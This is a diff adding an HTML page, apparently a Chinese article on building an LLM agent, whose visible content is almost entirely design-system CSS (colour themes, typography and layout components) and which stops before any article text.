@@ -1,0 +1,2652 @@
+<!DOCTYPE html>
+<html lang="zh-CN" data-hf-style="swiss" data-family="swiss" data-medium="page" data-theme="ikb" data-scheme="light" style="color-scheme:light">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>从一个 LLM 调用，到一个能交付的 Agent</title>
+<style>/* GZ:TOKENS:START · guizang-design v0.1.0 生成，不要手改；改设计请改 guizang-design 后运行 scripts/sync-skill.mjs */
+:root{
+  --font-display:'Inter','Noto Sans SC','PingFang SC','Hiragino Sans GB','Microsoft YaHei',system-ui,sans-serif;
+  --font-sans:'Inter','Noto Sans SC','PingFang SC','Hiragino Sans GB','Microsoft YaHei',system-ui,sans-serif;
+  --font-mono:'JetBrains Mono','Noto Sans SC',ui-monospace,'SF Mono',Menlo,monospace;
+  --sp-1:2px;
+  --sp-2:4px;
+  --sp-3:8px;
+  --sp-4:12px;
+  --sp-5:16px;
+  --sp-6:24px;
+  --sp-7:32px;
+  --sp-8:40px;
+  --sp-9:48px;
+  --sp-10:64px;
+  --sp-11:80px;
+  --sp-12:96px;
+  --sp-13:160px;
+  --radius-none:0px;
+  --radius-xs:0px;
+  --radius-sm:4px;
+  --radius-md:10px;
+  --radius-pill:999px;
+  --ease-standard:cubic-bezier(.2,0,.38,.9);
+  --ease-expressive:cubic-bezier(.4,.14,.3,1);
+  --ease-entrance:cubic-bezier(0,0,.3,1);
+  --ease-entrance-standard:cubic-bezier(0,0,.38,.9);
+  --ease-editorial:cubic-bezier(.22,1,.36,1);
+  --ease-page:cubic-bezier(.77,0,.175,1);
+  --dur-fast-1:70ms;
+  --dur-fast-2:110ms;
+  --dur-moderate-1:150ms;
+  --dur-moderate-2:240ms;
+  --dur-slow-1:400ms;
+  --dur-slow-2:700ms;
+  --dur-page:900ms;
+  --stagger-tight:70ms;
+  --stagger-base:100ms;
+  --stagger-loose:160ms;
+  --move-sm:8px;
+  --move-md:16px;
+  --move-lg:24px;
+  --paper:#fafaf8;
+  --paper-2:#f0f0ee;
+  --ink:#0a0a0a;
+  --muted:#737373;
+  --grey-1:#f0f0ee;
+  --grey-2:#d4d4d2;
+  --grey-3:#737373;
+  --accent:#002FA7;
+  --accent-on:#ffffff;
+  --accent-ink:#002FA7;
+  --accent-bright:#5B7BFF;
+  --accent-deep:#001d6b;
+  --accent-display:#002FA7;
+  --accent-ink-inverse:#96b0ff;
+  --accent-soft:#d5deef;
+  --text-primary:#0a0a0a;
+  --text-body:#252524;
+  --text-secondary:#525252;
+  --text-helper:#737373;
+  --text-placeholder:#a3a3a3;
+  --text-on-color:#ffffff;
+  --line-strong:#a3a3a3;
+  --line:#d4d4d2;
+  --line-subtle:#e0e0e0;
+  --ink-rgb:10,10,10;
+  --paper-rgb:250,250,248;
+  --accent-rgb:0,47,167;
+  --accent-on-rgb:255,255,255;
+  --accent-on-text:#ffffff;
+  --accent-on-text-rgb:255,255,255;
+  color-scheme:light;
+}
+[data-theme="ikb"]{
+  --paper:#fafaf8;
+  --paper-2:#f0f0ee;
+  --ink:#0a0a0a;
+  --muted:#737373;
+  --grey-1:#f0f0ee;
+  --grey-2:#d4d4d2;
+  --grey-3:#737373;
+  --accent:#002FA7;
+  --accent-on:#ffffff;
+  --accent-ink:#002FA7;
+  --accent-bright:#5B7BFF;
+  --accent-deep:#001d6b;
+  --accent-display:#002FA7;
+  --accent-ink-inverse:#96b0ff;
+  --accent-soft:#d5deef;
+  --text-primary:#0a0a0a;
+  --text-body:#252524;
+  --text-secondary:#525252;
+  --text-helper:#737373;
+  --text-placeholder:#a3a3a3;
+  --text-on-color:#ffffff;
+  --line-strong:#a3a3a3;
+  --line:#d4d4d2;
+  --line-subtle:#e0e0e0;
+  --ink-rgb:10,10,10;
+  --paper-rgb:250,250,248;
+  --accent-rgb:0,47,167;
+  --accent-on-rgb:255,255,255;
+  --accent-on-text:#ffffff;
+  --accent-on-text-rgb:255,255,255;
+  color-scheme:light;
+}
+[data-theme="lemon"]{
+  --paper:#fafaf8;
+  --paper-2:#f0f0ee;
+  --ink:#0a0a0a;
+  --muted:#737373;
+  --grey-1:#f0f0ee;
+  --grey-2:#d4d4d2;
+  --grey-3:#737373;
+  --accent:#FFD500;
+  --accent-on:#0a0a0a;
+  --accent-ink:#7a5f00;
+  --accent-bright:#FFE34D;
+  --accent-deep:#5e4900;
+  --accent-display:#7a5f00;
+  --accent-ink-inverse:#FFE34D;
+  --accent-soft:#fbf6e1;
+  --text-primary:#0a0a0a;
+  --text-body:#252524;
+  --text-secondary:#525252;
+  --text-helper:#737373;
+  --text-placeholder:#a3a3a3;
+  --text-on-color:#0a0a0a;
+  --line-strong:#a3a3a3;
+  --line:#d4d4d2;
+  --line-subtle:#e0e0e0;
+  --ink-rgb:10,10,10;
+  --paper-rgb:250,250,248;
+  --accent-rgb:255,213,0;
+  --accent-on-rgb:10,10,10;
+  --accent-on-text:#0a0a0a;
+  --accent-on-text-rgb:10,10,10;
+  color-scheme:light;
+}
+[data-theme="lemon-green"]{
+  --paper:#fafaf8;
+  --paper-2:#f0f0ee;
+  --ink:#0a0a0a;
+  --muted:#737373;
+  --grey-1:#f0f0ee;
+  --grey-2:#d4d4d2;
+  --grey-3:#737373;
+  --accent:#C5E803;
+  --accent-on:#0a0a0a;
+  --accent-ink:#4a6400;
+  --accent-bright:#D4F040;
+  --accent-deep:#3a5000;
+  --accent-display:#4a6400;
+  --accent-ink-inverse:#D4F040;
+  --accent-soft:#f2f8e1;
+  --text-primary:#0a0a0a;
+  --text-body:#252524;
+  --text-secondary:#525252;
+  --text-helper:#737373;
+  --text-placeholder:#a3a3a3;
+  --text-on-color:#0a0a0a;
+  --line-strong:#a3a3a3;
+  --line:#d4d4d2;
+  --line-subtle:#e0e0e0;
+  --ink-rgb:10,10,10;
+  --paper-rgb:250,250,248;
+  --accent-rgb:197,232,3;
+  --accent-on-rgb:10,10,10;
+  --accent-on-text:#0a0a0a;
+  --accent-on-text-rgb:10,10,10;
+  color-scheme:light;
+}
+[data-theme="safety-orange"]{
+  --paper:#fafaf8;
+  --paper-2:#f0f0ee;
+  --ink:#0a0a0a;
+  --muted:#737373;
+  --grey-1:#f0f0ee;
+  --grey-2:#d4d4d2;
+  --grey-3:#737373;
+  --accent:#FF6B35;
+  --accent-on:#ffffff;
+  --accent-ink:#c2410c;
+  --accent-bright:#FF9A6C;
+  --accent-deep:#9a3409;
+  --accent-display:#FF6B35;
+  --accent-ink-inverse:#FF9A6C;
+  --accent-soft:#fee8de;
+  --text-primary:#0a0a0a;
+  --text-body:#252524;
+  --text-secondary:#525252;
+  --text-helper:#737373;
+  --text-placeholder:#a3a3a3;
+  --text-on-color:#ffffff;
+  --line-strong:#a3a3a3;
+  --line:#d4d4d2;
+  --line-subtle:#e0e0e0;
+  --ink-rgb:10,10,10;
+  --paper-rgb:250,250,248;
+  --accent-rgb:255,107,53;
+  --accent-on-rgb:255,255,255;
+  --accent-on-text:#0a0a0a;
+  --accent-on-text-rgb:10,10,10;
+  color-scheme:light;
+}
+
+:root{
+  --fs-display:3.4rem;
+  --fw-display:200;
+  --lh-display:1.08;
+  --ls-display:-.03em;
+  --ff-display:var(--font-display);
+  --fst-display:normal;
+  --tt-display:none;
+  --fs-heading:1.8rem;
+  --fw-heading:200;
+  --lh-heading:1.2;
+  --ls-heading:-.015em;
+  --ff-heading:var(--font-sans);
+  --fst-heading:normal;
+  --tt-heading:none;
+  --fs-subhead:1.05rem;
+  --fw-subhead:500;
+  --lh-subhead:1.3;
+  --ls-subhead:0;
+  --ff-subhead:var(--font-sans);
+  --fst-subhead:normal;
+  --tt-subhead:none;
+  --fs-lead:1.05rem;
+  --fw-lead:400;
+  --lh-lead:1.6;
+  --ls-lead:0;
+  --ff-lead:var(--font-sans);
+  --fst-lead:normal;
+  --tt-lead:none;
+  --fs-body:1.0625rem;
+  --fw-body:400;
+  --lh-body:1.8;
+  --ls-body:0;
+  --ff-body:var(--font-sans);
+  --fst-body:normal;
+  --tt-body:none;
+  --fs-small:0.92rem;
+  --fw-small:400;
+  --lh-small:1.6;
+  --ls-small:0;
+  --ff-small:var(--font-sans);
+  --fst-small:normal;
+  --tt-small:none;
+  --fs-caption:0.75rem;
+  --fw-caption:400;
+  --lh-caption:1.55;
+  --ls-caption:0;
+  --ff-caption:var(--font-sans);
+  --fst-caption:normal;
+  --tt-caption:none;
+  --fs-label:0.875rem;
+  --fw-label:500;
+  --lh-label:1.3;
+  --ls-label:.14em;
+  --ff-label:var(--font-mono);
+  --fst-label:normal;
+  --tt-label:uppercase;
+  --fs-meta:0.75rem;
+  --fw-meta:500;
+  --lh-meta:1.3;
+  --ls-meta:.14em;
+  --ff-meta:var(--font-mono);
+  --fst-meta:normal;
+  --tt-meta:uppercase;
+  --fs-quote:2rem;
+  --fw-quote:300;
+  --lh-quote:1.45;
+  --ls-quote:-.02em;
+  --ff-quote:var(--font-sans);
+  --fst-quote:normal;
+  --tt-quote:none;
+  --fs-num-xl:3rem;
+  --fw-num-xl:800;
+  --lh-num-xl:0.88;
+  --ls-num-xl:-.04em;
+  --ff-num-xl:var(--font-display);
+  --fst-num-xl:normal;
+  --tt-num-xl:none;
+  --fs-display-zh:3.4rem;
+  --fw-display-zh:200;
+  --lh-display-zh:1.08;
+  --ls-display-zh:-.03em;
+  --ff-display-zh:var(--font-display);
+  --fst-display-zh:normal;
+  --tt-display-zh:none;
+  --fs-title:3.4rem;
+  --fw-title:200;
+  --lh-title:1.08;
+  --ls-title:-.03em;
+  --ff-title:var(--font-display);
+  --fst-title:normal;
+  --tt-title:none;
+  --fs-title-zh:3.4rem;
+  --fw-title-zh:200;
+  --lh-title-zh:1.08;
+  --ls-title-zh:-.03em;
+  --ff-title-zh:var(--font-display);
+  --fst-title-zh:normal;
+  --tt-title-zh:none;
+  --fs-num-l:3rem;
+  --fw-num-l:800;
+  --lh-num-l:0.88;
+  --ls-num-l:-.04em;
+  --ff-num-l:var(--font-display);
+  --fst-num-l:normal;
+  --tt-num-l:none;
+  --fs-num-m:3rem;
+  --fw-num-m:800;
+  --lh-num-m:0.88;
+  --ls-num-m:-.04em;
+  --ff-num-m:var(--font-display);
+  --fst-num-m:normal;
+  --tt-num-m:none;
+  --canvas-container:1200px;
+  --canvas-margin:80px;
+  --canvas-gutter:20px;
+  --canvas-measure:calc(32 * 1.0625rem);
+  --canvas-wide:800px;
+  --canvas-rail:200px;
+  --canvas-rail-gap:40px;
+}
+.gz-t-display{font-family:var(--ff-display);font-size:var(--fs-display);font-weight:var(--fw-display);line-height:var(--lh-display);letter-spacing:var(--ls-display);font-style:var(--fst-display);text-transform:var(--tt-display)}
+.gz-t-heading{font-family:var(--ff-heading);font-size:var(--fs-heading);font-weight:var(--fw-heading);line-height:var(--lh-heading);letter-spacing:var(--ls-heading);font-style:var(--fst-heading);text-transform:var(--tt-heading)}
+.gz-t-subhead{font-family:var(--ff-subhead);font-size:var(--fs-subhead);font-weight:var(--fw-subhead);line-height:var(--lh-subhead);letter-spacing:var(--ls-subhead);font-style:var(--fst-subhead);text-transform:var(--tt-subhead)}
+.gz-t-lead{font-family:var(--ff-lead);font-size:var(--fs-lead);font-weight:var(--fw-lead);line-height:var(--lh-lead);letter-spacing:var(--ls-lead);font-style:var(--fst-lead);text-transform:var(--tt-lead)}
+.gz-t-body{font-family:var(--ff-body);font-size:var(--fs-body);font-weight:var(--fw-body);line-height:var(--lh-body);letter-spacing:var(--ls-body);font-style:var(--fst-body);text-transform:var(--tt-body)}
+.gz-t-small{font-family:var(--ff-small);font-size:var(--fs-small);font-weight:var(--fw-small);line-height:var(--lh-small);letter-spacing:var(--ls-small);font-style:var(--fst-small);text-transform:var(--tt-small)}
+.gz-t-caption{font-family:var(--ff-caption);font-size:var(--fs-caption);font-weight:var(--fw-caption);line-height:var(--lh-caption);letter-spacing:var(--ls-caption);font-style:var(--fst-caption);text-transform:var(--tt-caption)}
+.gz-t-label{font-family:var(--ff-label);font-size:var(--fs-label);font-weight:var(--fw-label);line-height:var(--lh-label);letter-spacing:var(--ls-label);font-style:var(--fst-label);text-transform:var(--tt-label)}
+.gz-t-meta{font-family:var(--ff-meta);font-size:var(--fs-meta);font-weight:var(--fw-meta);line-height:var(--lh-meta);letter-spacing:var(--ls-meta);font-style:var(--fst-meta);text-transform:var(--tt-meta)}
+.gz-t-quote{font-family:var(--ff-quote);font-size:var(--fs-quote);font-weight:var(--fw-quote);line-height:var(--lh-quote);letter-spacing:var(--ls-quote);font-style:var(--fst-quote);text-transform:var(--tt-quote)}
+.gz-t-num-xl{font-family:var(--ff-num-xl);font-size:var(--fs-num-xl);font-weight:var(--fw-num-xl);line-height:var(--lh-num-xl);letter-spacing:var(--ls-num-xl);font-style:var(--fst-num-xl);text-transform:var(--tt-num-xl)}
+.gz-t-display-zh{font-family:var(--ff-display-zh);font-size:var(--fs-display-zh);font-weight:var(--fw-display-zh);line-height:var(--lh-display-zh);letter-spacing:var(--ls-display-zh);font-style:var(--fst-display-zh);text-transform:var(--tt-display-zh)}
+.gz-t-title{font-family:var(--ff-title);font-size:var(--fs-title);font-weight:var(--fw-title);line-height:var(--lh-title);letter-spacing:var(--ls-title);font-style:var(--fst-title);text-transform:var(--tt-title)}
+.gz-t-title-zh{font-family:var(--ff-title-zh);font-size:var(--fs-title-zh);font-weight:var(--fw-title-zh);line-height:var(--lh-title-zh);letter-spacing:var(--ls-title-zh);font-style:var(--fst-title-zh);text-transform:var(--tt-title-zh)}
+.gz-t-num-l{font-family:var(--ff-num-l);font-size:var(--fs-num-l);font-weight:var(--fw-num-l);line-height:var(--lh-num-l);letter-spacing:var(--ls-num-l);font-style:var(--fst-num-l);text-transform:var(--tt-num-l)}
+.gz-t-num-m{font-family:var(--ff-num-m);font-size:var(--fs-num-m);font-weight:var(--fw-num-m);line-height:var(--lh-num-m);letter-spacing:var(--ls-num-m);font-style:var(--fst-num-m);text-transform:var(--tt-num-m)}
+
+:lang(zh){line-break:strict;text-spacing-trim:normal;text-autospace:normal;overflow-wrap:break-word}
+:lang(zh) .gz-prose em:not(:lang(en)){font-style:normal;text-emphasis:filled dot;text-emphasis-position:under right}
+.gz-tnum{font-variant-numeric:tabular-nums}
+
+/* 歸藏设计系统 · 共享组件
+ *
+ * 一份结构，三种介质：根节点 <html data-family="magazine|swiss" data-medium="slide|card|page">。
+ * 这里只管布局、颜色和间距；字号、字重、行高一律由 gz-t-<角色> 类提供，
+ * 所以同一个组件放进 PPT、卡片、网页会自动换成各自的字号。
+ * 颜色只用语义 token（--text-* / --line-* / --accent*），换主题不需要改组件。
+ */
+
+/* ---------- 家族差异 ---------- */
+/* 单张卡片 / 单页换主题（[data-theme]）或反色（[data-surface]）时，线条变量要在那一层重新计算，否则沿用根节点的颜色 */
+[data-family="magazine"], [data-family="magazine"] [data-theme], [data-family="magazine"] [data-surface] { --img-pos: center top; --rule: 1px solid var(--line-strong); --rule-strong: 1px solid var(--line-strong) }
+[data-family="swiss"], [data-family="swiss"] [data-theme], [data-family="swiss"] [data-surface] { --img-pos: center center; --rule: 1px solid var(--line); --rule-strong: 2px solid var(--ink) }
+
+/* ---------- 表面：反色块里文字角色跟着换 ---------- */
+[data-surface="ink"] {
+  background: var(--ink); color: var(--paper);
+  --text-primary: var(--paper); --text-body: rgba(var(--paper-rgb), .86); --text-secondary: rgba(var(--paper-rgb), .72);
+  --text-helper: rgba(var(--paper-rgb), .62); --line: rgba(var(--paper-rgb), .22); --line-strong: rgba(var(--paper-rgb), .45);
+  --accent-ink: var(--accent-ink-inverse); --accent-display: var(--accent-ink-inverse); --rule-strong: 2px solid var(--paper);
+}
+[data-family="magazine"] [data-surface="ink"], [data-family="magazine"][data-surface="ink"] { --rule-strong: 1px solid rgba(var(--paper-rgb), .45) }
+[data-surface="accent"] {
+  background: var(--accent); color: var(--accent-on);
+  --text-primary: var(--accent-on); --text-body: rgba(var(--accent-on-rgb), .88); --text-secondary: rgba(var(--accent-on-rgb), .78);
+  --text-helper: rgba(var(--accent-on-rgb), .7); --line: rgba(var(--accent-on-rgb), .3); --line-strong: rgba(var(--accent-on-rgb), .55);
+  --accent-ink: var(--accent-on); --accent-display: var(--accent-on); --rule-strong: 2px solid var(--accent-on);
+}
+[data-surface="paper-2"] { background: var(--paper-2) }
+
+/* 强调色文字：小字用 accent-ink，大字 / 大数字用 accent-display（浅色强调色在纸上会自动加深；反色块里自动切换） */
+.gz-c-accent { color: var(--accent-ink) }
+.gz-c-accent-display { color: var(--accent-display) }
+
+/* ---------- 页眉页脚 chrome ---------- */
+.gz-chrome { display: flex; justify-content: space-between; align-items: baseline; gap: var(--sp-6); color: var(--text-helper); border-top: var(--rule); padding-top: var(--sp-4) }
+.gz-chrome[data-pos="top"] { border-top: 0; border-bottom: var(--rule); padding: 0 0 var(--sp-4) }
+.gz-chrome__group { display: flex; gap: var(--sp-5); min-width: 0 }
+.gz-chrome__accent { color: var(--accent-ink) }
+
+/* ---------- 封面 cover ---------- */
+.gz-cover { display: flex; flex-direction: column; gap: var(--sp-6); color: var(--text-primary) }
+.gz-cover__kicker { color: var(--text-helper) }
+[data-family="swiss"] .gz-cover__kicker { color: var(--accent-ink) }
+.gz-cover__body { width: 100%; container-type: inline-size }
+/* 标题按最长一行的字数自动收字号：--chars 由 components/render.mjs 算好写进 style；手写时填最长一行的字数（中文 1、西文约 0.56）。上限仍是 token 定的展示字号 */
+.gz-cover__title { margin: 0; font-size: min(var(--fs-display-zh), calc(100cqi / var(--chars, 1) * .94)) }
+.gz-cover__rule { width: 96px; height: 0; border-top: 2px solid var(--accent) }
+[data-family="swiss"] .gz-cover__rule { border-top-width: 3px }
+.gz-cover__sub { margin: 0; color: var(--text-body); max-width: 32em }
+.gz-cover__meta { margin-top: auto }
+/* 幻灯片、卡片：封面撑满画布，标题压在下半部 */
+[data-medium="slide"] .gz-cover, [data-medium="card"] .gz-cover { height: 100% }
+[data-medium="slide"] .gz-cover__body, [data-medium="card"] .gz-cover__body { margin-top: auto; display: flex; flex-direction: column; gap: var(--sp-7) }
+[data-medium="slide"] .gz-cover__meta, [data-medium="card"] .gz-cover__meta { margin-top: var(--sp-10) }
+/* 网页：杂志风居中，瑞士风左对齐 */
+[data-medium="page"] .gz-cover { padding: var(--sp-11) 0 var(--sp-9); border-bottom: var(--rule) }
+[data-medium="page"] .gz-cover__body { display: flex; flex-direction: column; gap: var(--sp-6) }
+[data-medium="page"][data-family="magazine"] .gz-cover { align-items: center; text-align: center }
+[data-medium="page"][data-family="magazine"] .gz-cover__body { align-items: center }
+[data-medium="page"] .gz-cover__meta { margin-top: var(--sp-6); border-top: 0; padding-top: 0; justify-content: center }
+[data-medium="page"][data-family="swiss"] .gz-cover__meta { justify-content: flex-start }
+
+/* ---------- 大数字 stat ---------- */
+.gz-stats { display: grid; grid-template-columns: repeat(var(--cols, 3), minmax(0, 1fr)); gap: var(--sp-9) var(--sp-7) }
+.gz-stats[data-count="1"] { --cols: 1 } .gz-stats[data-count="2"] { --cols: 2 } .gz-stats[data-count="4"] { --cols: 4 }
+[data-medium="card"] .gz-stats { --cols: 2 }
+[data-medium="card"] .gz-stats[data-count="1"], [data-medium="card"] .gz-stats[data-count="3"] { --cols: 1 }
+.gz-stat { display: flex; flex-direction: column; gap: var(--sp-4); border-top: var(--rule-strong); padding-top: var(--sp-5); min-width: 0 }
+.gz-stat__label { color: var(--text-helper) }
+.gz-stat__value { display: flex; align-items: baseline; gap: .06em; font-variant-numeric: tabular-nums lining-nums; white-space: nowrap }
+.gz-stat__unit { font-size: .4em; font-weight: 500; letter-spacing: 0; color: var(--text-secondary) }
+.gz-stat.is-accent .gz-stat__num { color: var(--accent-ink) }
+.gz-stat__note { margin: 0; color: var(--text-secondary); max-width: 24em }
+[data-medium="card"] .gz-stats[data-count="3"] .gz-stat { display: grid; grid-template-columns: auto 1fr; align-items: end; column-gap: var(--sp-7) }
+[data-medium="card"] .gz-stats[data-count="3"] .gz-stat__label { grid-column: 1 / -1 }
+[data-medium="card"] .gz-stats[data-count="3"] .gz-stat__note { padding-bottom: .6em }
+
+/* ---------- 引言 quote ---------- */
+.gz-quote { margin: 0; display: flex; flex-direction: column; gap: var(--sp-7) }
+.gz-quote__text { margin: 0; color: var(--text-primary); text-wrap: balance }
+.gz-quote__text p { margin: 0; text-wrap: balance }
+[data-family="magazine"] .gz-quote__text::before { content: "\201C"; display: block; font-family: var(--font-display); font-style: normal; color: var(--accent); font-size: 1.8em; line-height: 1; height: .55em }
+[data-family="swiss"] .gz-quote { border-top: var(--rule-strong); padding-top: var(--sp-7) }
+.gz-quote__source { color: var(--text-helper) }
+[data-medium="page"][data-family="magazine"] .gz-quote { align-items: center; text-align: center; padding: var(--sp-9) 0 }
+
+/* ---------- 流程 process：幻灯片 / 网页横排，卡片竖排 ---------- */
+.gz-process { list-style: none; margin: 0; padding: 0; display: grid; grid-template-columns: repeat(var(--n, 4), minmax(0, 1fr)); gap: var(--sp-7) }
+.gz-process__step { display: flex; flex-direction: column; gap: var(--sp-4); border-top: var(--rule-strong); padding-top: var(--sp-5); min-width: 0 }
+.gz-process__nb { color: var(--accent-ink) }
+.gz-process__title { margin: 0 }
+.gz-process__desc { margin: 0; color: var(--text-secondary) }
+[data-medium="card"] .gz-process { grid-template-columns: 1fr; gap: 0; border-bottom: var(--rule) }
+[data-medium="card"] .gz-process__step { display: grid; grid-template-columns: 112px minmax(0, 1fr); column-gap: var(--sp-6); row-gap: var(--sp-3); padding: var(--sp-7) 0 }
+[data-medium="card"] .gz-process__step + .gz-process__step { border-top: var(--rule) }
+[data-medium="card"] .gz-process__nb { grid-row: span 2 }
+[data-medium="page"] .gz-process { --n: 2; row-gap: var(--sp-8) }
+
+/* ---------- 对比 compare：左右分栏，卡片上下叠 ---------- */
+.gz-compare { display: grid; grid-template-columns: minmax(0, 1fr) 1px minmax(0, 1fr); gap: 0 var(--sp-9) }
+.gz-compare__rule { background: var(--line-strong) }
+.gz-compare__side { display: flex; flex-direction: column; gap: var(--sp-5); min-width: 0 }
+.gz-compare__tag { color: var(--text-helper) }
+.gz-compare__side[data-side="after"] .gz-compare__tag { color: var(--accent-ink) }
+.gz-compare__title { margin: 0 }
+.gz-compare__side[data-side="before"] .gz-compare__title { color: var(--text-secondary) }
+.gz-compare__desc { margin: 0; color: var(--text-secondary) }
+.gz-compare__list { margin: 0; padding: 0; list-style: none; display: flex; flex-direction: column; gap: var(--sp-3); color: var(--text-body) }
+.gz-compare__list li { padding-left: 1.2em; position: relative }
+.gz-compare__list li::before { content: ""; position: absolute; left: 0; top: .72em; width: .5em; border-top: 1px solid currentColor }
+[data-family="swiss"] .gz-compare__side[data-side="after"][data-surface] { padding: var(--sp-8) }
+[data-medium="card"] .gz-compare { grid-template-columns: 1fr; gap: var(--sp-8) 0 }
+[data-medium="card"] .gz-compare__rule { height: 1px }
+
+/* ---------- 图框 figure：照片 cover 裁切，截图 contain 放在底台上 ---------- */
+.gz-figure { margin: 0; display: flex; flex-direction: column; gap: var(--sp-4); min-width: 0 }
+.gz-figure__well { position: relative; aspect-ratio: var(--ratio, 16 / 10); overflow: hidden; background: var(--paper-2) }
+.gz-figure__well > img { display: block; width: 100%; height: 100%; object-fit: cover; object-position: var(--img-pos) }
+.gz-figure[data-ratio="16x9"] { --ratio: 16 / 9 } .gz-figure[data-ratio="16x10"] { --ratio: 16 / 10 } .gz-figure[data-ratio="4x3"] { --ratio: 4 / 3 }
+.gz-figure[data-ratio="3x2"] { --ratio: 3 / 2 } .gz-figure[data-ratio="1x1"] { --ratio: 1 } .gz-figure[data-ratio="3x4"] { --ratio: 3 / 4 } .gz-figure[data-ratio="21x9"] { --ratio: 21 / 9 }
+.gz-figure[data-kind="screenshot"] .gz-figure__well { display: flex; align-items: center; justify-content: center; padding: var(--inset, var(--sp-8)) }
+.gz-figure[data-kind="screenshot"] .gz-figure__well > img { width: auto; height: auto; max-width: 100%; max-height: 100%; object-fit: contain; border-radius: var(--radius-sm); box-shadow: 0 0 0 1px var(--line) }
+[data-family="magazine"] .gz-figure[data-kind="screenshot"] .gz-figure__well > img { box-shadow: 0 0 0 1px var(--line), 0 18px 40px -24px rgba(var(--ink-rgb), .45) }
+[data-family="swiss"] .gz-figure[data-kind="screenshot"] .gz-figure__well { background: var(--grey-1); border-top: 3px solid var(--accent) }
+[data-family="swiss"] .gz-figure[data-kind="screenshot"] .gz-figure__well > img { border-radius: 0 }
+.gz-figure__cap { color: var(--text-helper); display: flex; gap: var(--sp-4) }
+.gz-figure__idx { color: var(--accent-ink); flex: none }
+
+/* ---------- 图片网格 gallery ---------- */
+.gz-gallery { display: grid; grid-template-columns: repeat(var(--cols, 3), minmax(0, 1fr)); gap: var(--sp-7) var(--sp-6) }
+[data-medium="card"] .gz-gallery { --cols: 2 }
+[data-medium="card"] .gz-gallery[data-count="3"] > :first-child { grid-column: 1 / -1; --ratio: 16 / 9 }
+
+/* ---------- 条目清单 ledger ---------- */
+.gz-ledger { list-style: none; margin: 0; padding: 0; border-top: var(--rule-strong) }
+.gz-ledger__row { display: grid; grid-template-columns: var(--nb-w, 3.2em) minmax(0, 1fr) auto; column-gap: var(--sp-6); align-items: baseline; padding: var(--sp-6) 0; border-bottom: var(--rule) }
+.gz-ledger__nb { color: var(--accent-ink) }
+.gz-ledger__title { margin: 0 }
+.gz-ledger__note { margin: var(--sp-2) 0 0; color: var(--text-secondary) }
+.gz-ledger__value { color: var(--text-helper); text-align: right; white-space: nowrap }
+[data-medium="card"] .gz-ledger__row { --nb-w: 72px; padding: var(--sp-7) 0 }
+
+/* 歸藏设计系统 · 纹理与特效图层（纯 CSS，颜色全部来自 token）
+ * 来源：PPT 瑞士风 .dots / .dot-mat / .ring-mat / .cross-mat / .hatch，卡片杂志风 .grain / .paper-wash。
+ */
+
+/* 特效画布：铺满父容器、在内容下面、不挡点击。父容器需要 position: relative */
+.gz-effect { position: absolute; inset: 0; width: 100%; height: 100%; display: block; pointer-events: none; z-index: 0 }
+.gz-layer-content { position: relative; z-index: 1 }
+
+/* 点阵：前景色画点，跟随所在表面的文字色 */
+.gz-dots      { background-image: radial-gradient(currentColor 1px, transparent 1.2px); background-size: 12px 12px; opacity: .18 }
+.gz-dots-fine { background-image: radial-gradient(currentColor .8px, transparent 1px); background-size: 8px 8px; opacity: .14 }
+.gz-dots-bold { background-image: radial-gradient(currentColor 1.4px, transparent 1.6px); background-size: 18px 18px; opacity: .22 }
+
+.gz-dot-mat         { --mat: 14px; background-image: radial-gradient(currentColor 1.4px, transparent 1.6px); background-size: var(--mat) var(--mat); opacity: .5 }
+.gz-dot-mat.is-lg   { --mat: 22px } .gz-dot-mat.is-xl { --mat: 34px }
+.gz-dot-mat.is-dense{ --mat: 9px; opacity: .62 }
+.gz-ring-mat        { --mat: 18px; background-image: radial-gradient(circle, transparent 2px, currentColor 2px, currentColor 2.7px, transparent 2.9px); background-size: var(--mat) var(--mat); opacity: .55 }
+.gz-ring-mat.is-lg  { --mat: 28px }
+.gz-cross-mat       { --mat: 22px; background: currentColor; opacity: .42;
+  -webkit-mask: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='22' height='22'%3E%3Cpath d='M8 8l6 6M14 8l-6 6' stroke='%23000' stroke-width='1.4'/%3E%3C/svg%3E") 0 0 / var(--mat) var(--mat);
+          mask: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='22' height='22'%3E%3Cpath d='M8 8l6 6M14 8l-6 6' stroke='%23000' stroke-width='1.4'/%3E%3C/svg%3E") 0 0 / var(--mat) var(--mat) }
+.gz-cross-mat.is-lg { --mat: 32px }
+.gz-hatch           { background-image: repeating-linear-gradient(135deg, currentColor 0 1px, transparent 1px 8px); opacity: .55 }
+
+/* 纸张颗粒与墨色晕染：杂志风卡片的「氛围层」，叠在特效画布上、内容下 */
+.gz-grain      { position: absolute; inset: 0; pointer-events: none; z-index: 0; mix-blend-mode: multiply; opacity: .35;
+                 background-image: radial-gradient(rgba(0,0,0,.045) 1px, transparent 1px); background-size: 3px 3px }
+[data-scheme="dark"] .gz-grain, .gz-grain.is-dark { mix-blend-mode: screen; opacity: .26; background-image: radial-gradient(rgba(255,244,214,.10) 1px, transparent 1px) }
+.gz-paper-wash { position: absolute; inset: 0; pointer-events: none; z-index: 0;
+                 background: linear-gradient(180deg, rgba(var(--ink-rgb), .02), rgba(var(--ink-rgb), .05) 60%, rgba(var(--ink-rgb), .08)) }
+.gz-ink-vignette { position: absolute; inset: 0; pointer-events: none; z-index: 0;
+                 background: radial-gradient(circle at 18% 12%, rgba(var(--ink-rgb), .10), transparent 34%), radial-gradient(circle at 82% 80%, rgba(var(--accent-rgb), .10), transparent 38%) }
+
+/* PPT 杂志风：WebGL 背景上的纸 / 墨蒙版，保证文字可读（原 .slide.light/.dark::before） */
+.gz-veil       { position: absolute; inset: 0; pointer-events: none; z-index: 0; backdrop-filter: blur(3px); background: rgba(var(--paper-rgb), .78) }
+.gz-veil.is-ink{ background: rgba(var(--ink-rgb), .78) }
+.gz-veil.is-hero { backdrop-filter: none; background: rgba(var(--paper-rgb), .16) }
+.gz-veil.is-hero.is-ink { background: rgba(var(--ink-rgb), .12) }
+
+@media (prefers-reduced-motion: reduce) { .gz-effect { animation: none } }
+
+/* GZ:TOKENS:END */
+</style>
+<style>  /* ══════════════════════════════════════
+     ROOT VARIABLES
+     ══════════════════════════════════════ */
+  /* Colours, fonts, type roles and the --sp-* spacing scale come from the design system
+     (assets/gz-swiss.css, inlined before this file; theme = <html data-theme>).
+     Paper and greys stay the same in every theme; only the accent changes.
+     The names below are this stylesheet's own vocabulary, mapped onto its roles. */
